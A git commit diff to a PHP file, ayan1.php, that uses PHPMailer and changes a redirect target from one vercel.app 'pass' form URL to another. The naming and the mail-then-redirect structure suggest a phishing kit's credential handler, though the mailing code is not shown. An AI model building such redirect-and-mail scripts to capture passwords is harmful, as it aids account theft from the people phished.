d62a1a06a21f4b2b4ac8a33fc9d96102692aa1c5
asif1012-lgtm <hpboost8@gmail.com>
2025-07-22 15:21:25 +0500

    Update ayan1.php

--- ayan1.php
+++ ayan1.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://request-help-form-pass.vercel.app/");
+header("Location:https://ayan1pass.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
